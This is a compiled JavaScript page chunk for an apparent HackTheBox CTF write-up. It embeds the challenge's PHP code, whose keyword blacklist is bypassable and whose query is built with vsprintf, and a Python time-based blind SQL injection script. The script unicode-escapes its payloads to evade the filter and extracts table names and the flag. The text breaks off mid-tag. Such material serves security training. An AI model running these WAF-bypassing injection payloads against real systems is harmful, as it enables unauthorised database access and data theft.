import{S as Yl,i as sn,s as an,W as ll,w as _,x as A,y as w,Z as ln,_ as zl,f as C,t as b,z as $,$ as Gl,k as l,q as F,a as i,T as Xl,l as n,m as o,r as p,h as a,c as y,U as Zl,n as Y,b as z,D as s,E as nn}from"../../../../chunks/index-9671d79c.js";import{P as on}from"../../../../chunks/post_layout-76c250d8.js";import{I as T}from"../../../../chunks/post_card-ea1dea7e.js";function en(G){let c,f,L,O,E,g,m,Us,ss,Ql=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" php="true"><div class="language-id">php</div><div class='code-container'><code><div class='line'><span style="color: #89DDFF">&lt;?</span><span style="color: #EEFFFF">php </span><span style="color: #82AAFF">error_reporting</span><span style="color: #89DDFF">(</span><span style="color: #F78C6C">0</span><span style="color: #89DDFF">);</span></div><div class='line'><span style="color: #89DDFF">require</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">config.php</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">;</span></div><div class='line'></div><div class='line'><span style="color: #C792EA">class</span><span style="color: #EEFFFF"> </span><span style="color: #FFCB6B">db</span><span style="color: #EEFFFF"> </span><span style="color: #C792EA">extends</span><span style="color: #EEFFFF"> </span><span style="color: #FFCB6B">Connection</span><span style="color: #EEFFFF"> </span></div><div class='line'><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #C792EA">public</span><span style="color: #EEFFFF"> </span><span style="color: #C792EA">function</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">waf</span><span style="color: #89DDFF">($</span><span style="color: #EEFFFF">s</span><span style="color: #89DDFF">)</span><span style="color: #EEFFFF"> </span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">if</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">preg_match_all</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">/</span><span style="color: #89DDFF">'.</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">implode</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">|</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">array</span><span style="color: #89DDFF">(</span></div><div class='line'><span style="color: #EEFFFF">            </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">[</span><span style="color: #89DDFF">'</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">preg_quote</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">(*&lt;=&gt;|'&-@</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">)</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">]</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">,</span></div><div class='line'><span style="color: #EEFFFF">            </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">select</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">and</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">or</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">if</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">by</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">from</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> </span></div><div class='line'><span style="color: #EEFFFF">            </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">where</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">as</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">is</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">in</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">not</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">having</span><span style="color: #89DDFF">'</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">))</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">/i</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">$</span><span style="color: #EEFFFF">s</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">$</span><span style="color: #EEFFFF">matches</span><span style="color: #89DDFF">))</span><span style="color: #EEFFFF"> </span></div><div class='line'><span style="color: #EEFFFF">            </span><span style="color: #89DDFF">die</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">var_dump</span><span style="color: #89DDFF">($</span><span style="color: #EEFFFF">matches</span><span style="color: #89DDFF">[</span><span style="color: #F78C6C">0</span><span style="color: #89DDFF">]));</span></div><div class='line'><span style="color: #EEFFFF">        </span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">return</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">json_decode</span><span style="color: #89DDFF">($</span><span style="color: #EEFFFF">s</span><span style="color: #89DDFF">);</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&#125;</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #C792EA">public</span><span style="color: #EEFFFF"> </span><span style="color: #C792EA">function</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">query</span><span style="color: #89DDFF">($</span><span style="color: #EEFFFF">sql</span><span style="color: #89DDFF">)</span><span style="color: #EEFFFF"> </span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">$</span><span style="color: #EEFFFF">args </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">func_get_args</span><span style="color: #89DDFF">();</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #82AAFF">unset</span><span style="color: #89DDFF">($</span><span style="color: #EEFFFF">args</span><span style="color: #89DDFF">[</span><span style="color: #F78C6C">0</span><span style="color: #89DDFF">]);</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">return</span><span style="color: #EEFFFF"> </span><span style="color: #C792EA">parent</span><span style="color: #89DDFF">::</span><span style="color: #82AAFF">query</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">vsprintf</span><span style="color: #89DDFF">($</span><span style="color: #EEFFFF">sql</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">$</span><span style="color: #EEFFFF">args</span><span style="color: #89DDFF">));</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&#125;</span></div><div class='line'><span style="color: #89DDFF">&#125;</span></div><div class='line'></div><div class='line'><span style="color: #89DDFF">$</span><span style="color: #EEFFFF">db </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #F78C6C">new</span><span style="color: #EEFFFF"> </span><span style="color: #FFCB6B">db</span><span style="color: #89DDFF">();</span></div><div class='line'></div><div class='line'><span style="color: #89DDFF">if</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">($</span><span style="color: #EEFFFF">_SERVER</span><span style="color: #89DDFF">[</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">REQUEST_METHOD</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">]</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">==</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">POST</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">)</span><span style="color: #EEFFFF"> </span></div><div class='line'><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">$</span><span style="color: #EEFFFF">obj </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">$</span><span style="color: #EEFFFF">db</span><span style="color: #89DDFF">-&gt;</span><span style="color: #82AAFF">waf</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">file_get_contents</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">php://input</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">));</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">$</span><span style="color: #EEFFFF">db</span><span style="color: #89DDFF">-&gt;</span><span style="color: #82AAFF">query</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">"</span><span style="color: #F78C6C">SELECT</span><span style="color: #C3E88D"> note </span><span style="color: #F78C6C">FROM</span><span style="color: #C3E88D"> notes </span><span style="color: #F78C6C">WHERE</span><span style="color: #C3E88D"> assignee </span><span style="color: #89DDFF">=</span><span style="color: #C3E88D"> '%s'</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">$</span><span style="color: #EEFFFF">obj</span><span style="color: #89DDFF">-&gt;</span><span style="color: #EEFFFF">user</span><span style="color: #89DDFF">);</span></div><div class='line'></div><div class='line'><span style="color: #89DDFF">&#125;</span><span style="color: #EEFFFF"> </span></div><div class='line'><span style="color: #89DDFF">else</span><span style="color: #EEFFFF"> </span></div><div class='line'><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">die</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">highlight_file</span><span style="color: #89DDFF">(__FILE__,</span><span style="color: #EEFFFF"> </span><span style="color: #F78C6C">1</span><span style="color: #89DDFF">));</span></div><div class='line'><span style="color: #89DDFF">&#125;</span></div><div class='line'><span style="color: #89DDFF">?&gt;</span></div></code></div></pre>`,as,t,ls,I,Zs,ns,Js,Qs,os,Vs,Ys,sa,es,v,aa,Fs,la,na,ps,oa,ea,ts,Fa,pa,rs,ta,ra,ca,cs,R,ia,is,ya,Ea,Da,ys,k,da,Es,va,fa,x,ha,ga,ma,Ds,j,ua,ds,_a,Aa,wa,vs,fs,Ca,ba,hs,gs,$a,La,ms,us,q,Ia,_s,As,M,ka,ws,Cs,B,Sa,bs,$s,H,Ta,Ls,S,xa,Is,Pa,Oa,ks,Ra,ja,qa,Ss,X,Ma,P,Ba,Ha,Ts,Z,Na,xs,Wa,Ua,Ps,Os,Ka,Ks,Rs,Vl=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" py="true"><div class="language-id">py</div><div class='code-container'><code><div class='line'><span style="color: #546E7A">#!/usr/bin/python3</span></div><div class='line'><span style="color: #546E7A">#</span><span style="color: #89DDFF">TODO</span><span style="color: #546E7A">: Too slow add threading </span></div><div class='line'><span style="color: #89DDFF">import</span><span style="color: #EEFFFF"> requests</span></div><div class='line'><span style="color: #89DDFF">from</span><span style="color: #EEFFFF"> time </span><span style="color: #89DDFF">import</span><span style="color: #EEFFFF"> time</span></div><div class='line'><span style="color: #89DDFF">from</span><span style="color: #EEFFFF"> sys </span><span style="color: #89DDFF">import</span><span style="color: #EEFFFF"> argv</span></div><div class='line'><span style="color: #89DDFF">import</span><span style="color: #EEFFFF"> string</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">url </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #C792EA">f</span><span style="color: #C3E88D">"http://</span><span style="color: #EEFFFF">&#123;argv</span><span style="color: #89DDFF">[</span><span style="color: #F78C6C">1</span><span style="color: #89DDFF">]</span><span style="color: #EEFFFF">&#125;</span><span style="color: #C3E88D">/"</span></div><div class='line'><span style="color: #EEFFFF">char_set </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> string</span><span style="color: #89DDFF">.</span><span style="color: #F07178">ascii_lowercase</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">+</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">_</span><span style="color: #89DDFF">'</span><span style="color: #EEFFFF"> </span><span style="color: #546E7A">#+ string.digits  </span></div><div class='line'><span style="color: #EEFFFF">flag_set </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> string</span><span style="color: #89DDFF">.</span><span style="color: #F07178">ascii_lowercase</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">+</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">_</span><span style="color: #89DDFF">'</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">+</span><span style="color: #EEFFFF"> string</span><span style="color: #89DDFF">.</span><span style="color: #F07178">digits</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">+</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">&#125;</span><span style="color: #89DDFF">'</span><span style="color: #EEFFFF"> </span><span style="color: #546E7A">#+ string.ascii_uppercase </span></div><div class='line'></div><div class='line'><span style="color: #C792EA">def</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">uni_encode</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">payload</span><span style="color: #89DDFF">):</span></div><div class='line'><span style="color: #EEFFFF">	result </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">""</span></div><div class='line'><span style="color: #EEFFFF">	</span><span style="color: #89DDFF">for</span><span style="color: #EEFFFF"> i </span><span style="color: #89DDFF">in</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">range</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">len</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">payload</span><span style="color: #89DDFF">)):</span></div><div class='line'><span style="color: #EEFFFF">		result </span><span style="color: #89DDFF">+=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">'</span><span style="color: #EEFFFF">\\</span><span style="color: #C3E88D">u%.4X</span><span style="color: #89DDFF">'</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">%</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">ord</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">payload</span><span style="color: #89DDFF">[</span><span style="color: #82AAFF">i</span><span style="color: #89DDFF">])</span></div><div class='line'><span style="color: #EEFFFF">	</span><span style="color: #89DDFF">return</span><span style="color: #EEFFFF"> result	</span></div><div class='line'></div><div class='line'><span style="color: #C792EA">def</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">fetch_data</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">url</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> len_</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> name</span><span style="color: #89DDFF">):</span></div><div class='line'><span style="color: #EEFFFF">	</span><span style="color: #C792EA">global</span><span style="color: #EEFFFF"> database</span></div><div class='line'><span style="color: #EEFFFF">	</span><span style="color: #82AAFF">print</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">[*]Getting info...</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #EEFFFF">	res </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">""</span></div><div class='line'><span style="color: #EEFFFF">	</span><span style="color: #546E7A">#print('&#123;"user":"%s"&#125;' % payload)</span></div><div class='line'><span style="color: #EEFFFF">	</span><span style="color: #89DDFF">for</span><span style="color: #EEFFFF"> i </span><span style="color: #89DDFF">in</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">range</span><span style="color: #89DDFF">(</span><span style="color: #F78C6C">1</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> len_</span><span style="color: #89DDFF">+</span><span style="color: #F78C6C">1</span><span style="color: #89DDFF">):</span></div><div class='line'><span style="color: #EEFFFF">		</span><span style="color: #89DDFF">for</span><span style="color: #EEFFFF"> char </span><span style="color: #89DDFF">in</span><span style="color: #EEFFFF"> char_set</span><span style="color: #89DDFF">:</span></div><div class='line'><span style="color: #EEFFFF">			payload </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #C792EA">f</span><span style="color: #C3E88D">"d' AND (SELECT 1337 FROM (SELECT((IF((SELECT SUBSTR(column_name, </span><span style="color: #EEFFFF">&#123;i&#125;</span><span style="color: #C3E88D">, 1) FROM information_schema.columns WHERE table_schema LIKE '</span><span style="color: #EEFFFF">&#123;database&#125;</span><span style="color: #C3E88D">' AND table_name LIKE '%flag%' LIMIT 1 ) = '</span><span style="color: #EEFFFF">&#123;char&#125;</span><span style="color: #C3E88D">' ,SLEEP(5),0))))x)-- wxyg"</span></div><div class='line'><span style="color: #EEFFFF">			</span><span style="color: #546E7A">#print (payload)</span></div><div class='line'><span style="color: #EEFFFF">			</span><span style="color: #546E7A">#exit()</span></div><div class='line'><span style="color: #EEFFFF">			encoded_payload </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">uni_encode</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">payload</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #EEFFFF">			json_data </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">&#123;"user":"%s"&#125;</span><span style="color: #89DDFF">'</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">%</span><span style="color: #EEFFFF"> encoded_payload</span></div><div class='line'><span style="color: #EEFFFF">			</span></div><div class='line'><span style="color: #EEFFFF">			</span><span style="color: #546E7A">#print(encoded_payload)</span></div><div class='line'><span style="color: #EEFFFF">			</span><span style="color: #546E7A">#print(json_data)</span></div><div class='line'><span style="color: #EEFFFF">			</span><span style="color: #89DDFF">try</span><span style="color: #89DDFF">:</span></div><div class='line'><span style="color: #EEFFFF">				start </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">time</span><span style="color: #89DDFF">()</span></div><div class='line'><span style="color: #EEFFFF">				r </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> requests</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">post</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">url</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> </span><span style="color: #EEFFFF">data</span><span style="color: #89DDFF">=</span><span style="color: #82AAFF">json_data</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #EEFFFF">				end </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">time</span><span style="color: #89DDFF">()</span></div><div class='line'><span style="color: #EEFFFF">			</span><span style="color: #89DDFF">except</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">:</span></div><div class='line'><span style="color: #EEFFFF">				</span><span style="color: #89DDFF">pass</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">			</span><span style="color: #89DDFF">if</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">end </span><span style="color: #89DDFF">-</span><span style="color: #EEFFFF"> start</span><span style="color: #89DDFF">)</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&gt;</span><span style="color: #EEFFFF"> </span><span style="color: #F78C6C">5</span><span style="color: #89DDFF">:</span></div><div class='line'><span style="color: #EEFFFF">				res </span><span style="color: #89DDFF">+=</span><span style="color: #EEFFFF"> char</span></div><div class='line'><span style="color: #EEFFFF">				</span><span style="color: #82AAFF">print</span><span style="color: #89DDFF">(</span><span style="color: #C792EA">f</span><span style="color: #C3E88D">"[*]</span><span style="color: #82AAFF">&#123;name&#125;</span><span style="color: #C3E88D">: </span><span style="color: #82AAFF">&#123;res&#125;</span><span style="color: #C3E88D">"</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #EEFFFF">				</span><span style="color: #546E7A">#break</span></div><div class='line'><span style="color: #EEFFFF">			</span></div><div class='line'><span style="color: #EEFFFF">	</span><span style="color: #89DDFF">return</span><span style="color: #EEFFFF"> res</span></div><div class='line'></div><div class='line'><span style="color: #C792EA">def</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">get_flag</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">url</span><span style="color: #89DDFF">):</span></div><div class='line'><span style="color: #EEFFFF">	</span><span style="color: #C792EA">global</span><span style="color: #EEFFFF"> database</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> table</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> column</span></div><div class='line'><span style="color: #EEFFFF">	</span><span style="color: #82AAFF">print</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">[*]Getting Flag...</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #EEFFFF">	flag </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">HTB&#123;</span><span style="color: #89DDFF">"</span></div><div class='line'><span style="color: #EEFFFF">	</span></div><div class='line'><span style="color: #EEFFFF">	</span><span style="color: #89DDFF">while</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">&#125;</span><span style="color: #89DDFF">'</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">not</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">in</span><span style="color: #EEFFFF"> flag</span><span style="color: #89DDFF">:</span></div><div class='line'><span style="color: #EEFFFF">		pos </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">len</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">flag</span><span style="color: #89DDFF">)</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">+</span><span style="color: #EEFFFF"> </span><span style="color: #F78C6C">1</span></div><div class='line'><span style="color: #EEFFFF">		</span><span style="color: #89DDFF">for</span><span style="color: #EEFFFF"> char </span><span style="color: #89DDFF">in</span><span style="color: #EEFFFF"> flag_set</span><span style="color: #89DDFF">:</span></div><div class='line'><span style="color: #EEFFFF">			payload </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #C792EA">f</span><span style="color: #C3E88D">"d' AND (SELECT 1337 FROM (SELECT((IF((SELECT SUBSTR(</span><span style="color: #EEFFFF">&#123;column&#125;</span><span style="color: #C3E88D">, </span><span style="color: #EEFFFF">&#123;pos&#125;</span><span style="color: #C3E88D">, 1) FROM </span><span style="color: #EEFFFF">&#123;database&#125;</span><span style="color: #C3E88D">.</span><span style="color: #EEFFFF">&#123;table&#125;</span><span style="color: #C3E88D"> ) = '</span><span style="color: #EEFFFF">&#123;char&#125;</span><span style="color: #C3E88D">', SLEEP(3), 0))))x)-- wxyg"</span></div><div class='line'><span style="color: #EEFFFF">			</span><span style="color: #546E7A">#print (payload)</span></div><div class='line'><span style="color: #EEFFFF">			</span><span style="color: #546E7A">#exit()</span></div><div class='line'><span style="color: #EEFFFF">			encoded_payload </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">uni_encode</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">payload</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #EEFFFF">			json_data </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">&#123;"user":"%s"&#125;</span><span style="color: #89DDFF">'</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">%</span><span style="color: #EEFFFF"> encoded_payload</span></div><div class='line'><span style="color: #EEFFFF">			</span></div><div class='line'><span style="color: #EEFFFF">			</span><span style="color: #546E7A">#print(encoded_payload)</span></div><div class='line'><span style="color: #EEFFFF">			</span><span style="color: #546E7A">#print(json_data)</span></div><div class='line'><span style="color: #EEFFFF">			</span><span style="color: #89DDFF">try</span><span style="color: #89DDFF">:</span></div><div class='line'><span style="color: #EEFFFF">				start </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">time</span><span style="color: #89DDFF">()</span></div><div class='line'><span style="color: #EEFFFF">				r </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> requests</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">post</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">url</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> </span><span style="color: #EEFFFF">data</span><span style="color: #89DDFF">=</span><span style="color: #82AAFF">json_data</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #EEFFFF">				end </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">time</span><span style="color: #89DDFF">()</span></div><div class='line'><span style="color: #EEFFFF">			</span><span style="color: #89DDFF">except</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">:</span></div><div class='line'><span style="color: #EEFFFF">				</span><span style="color: #89DDFF">pass</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">			</span><span style="color: #89DDFF">if</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">end </span><span style="color: #89DDFF">-</span><span style="color: #EEFFFF"> start</span><span style="color: #89DDFF">)</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&gt;</span><span style="color: #EEFFFF"> </span><span style="color: #F78C6C">3</span><span style="color: #89DDFF">:</span></div><div class='line'><span style="color: #EEFFFF">				flag </span><span style="color: #89DDFF">+=</span><span style="color: #EEFFFF"> char</span></div><div class='line'><span style="color: #EEFFFF">				</span><span style="color: #82AAFF">print</span><span style="color: #89DDFF">(</span><span style="color: #C792EA">f</span><span style="color: #C3E88D">"[*]FLag: </span><span style="color: #82AAFF">&#123;flag&#125;</span><span style="color: #C3E88D">"</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #EEFFFF">				</span><span style="color: #89DDFF">break</span></div><div class='line'><span style="color: #EEFFFF">	</span><span style="color: #89DDFF">return</span><span style="color: #EEFFFF"> flag</span></div><div class='line'></div><div class='line'></div><div class='line'><span style="color: #546E7A">#payload = "d' AND (SELECT 1337 FROM (SELECT((IF((SELECT SUBSTR(table_schema, 1, 1) FROM information_schema.tables WHERE table_schema LIKE '%db%' AND table_name LIKE '%flag%' LIMIT 1 ) = 'd' ,SLEEP(5),0))))x)-- wxyg"</span></div><div class='line'><span style="color: #546E7A"># database = fetch_data(url, 8, Database)</span></div><div class='line'><span style="color: #546E7A"># print(database)</span></div><div class='line'><span style="color: #EEFFFF">database </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">db_m8452</span><span style="color: #89DDFF">"</span></div><div class='line'></div><div class='line'></div><div class='line'><span style="color: #546E7A">#payload = f"d' AND (SELECT 1337 FROM (SELECT((IF((SELECT SUBSTR(table_name, &#123;i&#125;, 1) FROM information_schema.tables WHERE table_schema LIKE '&#123;database&#125;' AND table_name LIKE '%flag%' LIMIT 1 ) = '&#123;char&#125;' ,SLEEP(5),0))))x)-- wxyg"</span></div><div class='line'><span style="color: #546E7A">#tables = fetch_data(url, 21, "Tables")</span></div><div class='line'><span style="color: #EEFFFF">table </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">definitely_not_a_flag</span><span style="color: #89DDFF">"</span></div><div class='line'></div><div class='line'><span style="color: #546E7A">#payload = f"d' AND (SELECT 1337 FROM (SELECT((IF((SELECT SUBSTR(column_name, &#123;i&#125;, 1) FROM information_schema.columns WHERE table_schema LIKE '&#123;database&#125;' AND table_name LIKE '%flag%' LIMIT 1 ) = '&#123;char&#125;' ,SLEEP(5),0))))x)-- wxyg"</span></div><div class='line'><span style="color: #546E7A">#columns = fetch_data(url, 4, "Columns")</span></div><div class='line'><span style="color: #EEFFFF">column </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">flag</span><span style="color: #89DDFF">"</span></div><div class='line'></div><div class='line'><span style="color: #82AAFF">print</span><span style="color: #89DDFF">(</span><span style="color: #C792EA">f</span><span style="color: #C3E88D">"[!]Flag: </span><span style="color: #82AAFF">&#123;get_flag</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">url</span><span style="color: #89DDFF">)</span><span style="color: #82AAFF">&#125;</span><span style="color: #C3E88D">"</span><span style="color: 